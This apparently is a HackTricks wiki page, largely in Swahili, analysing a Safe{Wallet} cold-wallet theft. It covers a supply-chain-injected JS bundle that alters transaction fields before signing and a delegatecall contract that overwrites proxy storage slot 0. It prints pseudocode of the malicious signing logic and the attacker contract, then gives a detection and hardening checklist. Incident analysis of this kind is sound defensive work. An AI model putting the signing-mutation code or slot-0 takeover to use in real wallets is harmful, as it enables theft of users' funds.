# Web3 Kupotoshwa kwa Mtiririko wa Kusaini & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Mnyororo wa wizi wa cold-wallet uliounganisha **uvunjaji wa mnyororo wa ugavi (supply-chain compromise) wa Safe{Wallet} web UI** na **on-chain delegatecall primitive ambayo ilibadilisha pointer ya implementation ya proxy (slot 0)**. Mambo muhimu ni:

- Ikiwa dApp inaweza kuingiza code ndani ya njia ya kusaini, inaweza kufanya signer atengeneze sahihi halali ya **EIP-712 signature juu ya fields zilizochaguliwa na mshambuliaji** huku ikirejesha data ya UI ya awali ili signers wengine wasibaini.
- Safe proxies store `masterCopy` (implementation) at **storage slot 0**. A delegatecall to a contract that writes to slot 0 effectively “upgrades” the Safe to attacker logic, yielding full control of the wallet.

## Off-chain: Targeted signing mutation in Safe{Wallet}

Bundle ya Safe iliyoharibika (`_app-*.js`) ilishambulia kwa kuchagua anwani maalum za Safe + signer. Logic iliyochomwa ilitekelezwa mara moja kabla ya wito wa kusaini:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Sifa za mashambulizi
- **Context-gated**: hard-coded allowlists kwa Safes/signers wa wahasiriwa ziliizuia kelele na kupunguza utambuzi.
- **Last-moment mutation**: fields (`to`, `data`, `operation`, gas) zilibadilishwa mara tu kabla ya `signTransaction`, kisha zikarejeshwa, hivyo payloads za mapendekezo kwenye UI zilionekana salama wakati saini zikiendana na payload ya mshambuliaji.
- **EIP-712 opacity**: wallets zilionyesha data iliyopangwa lakini hazikusoma calldata iliyozamishwa wala kuonyesha `operation = delegatecall`, na kufanya ujumbe uliobadilishwa kusainiwa bila kuona yaliyomo.

### Umuhimu wa uthibitisho wa Gateway
Mapendekezo ya Safe yanwasilishwa kwa **Safe Client Gateway**. Kabla ya ukaguzi uliimarishwa, gateway inaweza kukubali pendekezo ambapo `safeTxHash`/saini zilihusiana na vigezo tofauti kuliko mwili wa JSON ikiwa UI ilibadilisha zuio baada ya kusaini. Baada ya tukio, gateway sasa inakata mapendekezo ambayo hash/saini hazilingani na muamala uliowasilishwa. Uthibitishaji sawa wa hash upande wa server unapaswa kutekelezwa kwa API yoyote ya signing-orchestration.

## Kwenye mnyororo: Delegatecall proxy takeover via slot collision

Proxies za Safe zinahifadhi `masterCopy` katika **storage slot 0** na kupeleka mantiki yote kwake. Kwa sababu Safe inasaidia **`operation = 1` (delegatecall)**, muamala wowote uliosainiwa unaweza kuelekeza kwenye mkataba wowote na kuendesha msimbo wake katika muktadha wa uhifadhi wa proxy.

Mkataba wa mshambuliaji ulifanana na ERC-20 `transfer(address,uint256)` lakini badala yake uliandika `_to` katika slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Waathiriwa wanasaini `execTransaction` na `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe `masterCopy` inathibitisha sahihi za kusaini kwa vigezo hivi.
3. Proxy inafanya delegatecall ndani ya `attackerContract`; mwili wa `transfer` unaandika slot 0.
4. Slot 0 (`masterCopy`) sasa inaelekeza kwenye mantiki inayodhibitiwa na mshambuliaji → **kutekwa kabisa kwa wallet na kuondolewa kwa fedha**.

## Detection & hardening checklist

- **UI integrity**: pin JS assets / SRI; angalia tofauti za bundle; chukulia signing UI kama sehemu ya mpaka wa uaminifu.
- **Sign-time validation**: hardware wallets with **EIP-712 clear-signing**; onyesha wazi `operation` na decode nested calldata. Kataa kusaini wakati `operation = 1` isipokuwa sera inaruhusu.
- **Server-side hash checks**: gateways/services zinazopitisha mapendekezo lazima zikokotoe tena `safeTxHash` na kuthibitisha kuwa sahihi za kusaini zinaendana na mashamba yaliyowasilishwa.
- **Policy/allowlists**: sheria za preflight kwa `to`, selectors, aina za asset, na zuii delegatecall isipokuwa kwa flows zilizokaguliwa. Inahitaji huduma ya sera ya ndani kabla ya kutangaza fully signed transactions.
- **Contract design**: epuka kuonyesha delegatecall isiyotengenezwa katika multisig/treasury wallets isipokuwa inahitajika kabisa. Weka upgrade pointers mbali na slot 0 au lindwa kwa mantiki ya upgrade iliyo wazi na access control.
- **Monitoring**: onyesha tahadhari kuhusu utekelezaji wa delegatecall kutoka wallets zinazoendelea treasury funds, na kuhusu mapendekezo yanayobadilisha `operation` kutoka kwenye patterns za kawaida za `call`.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
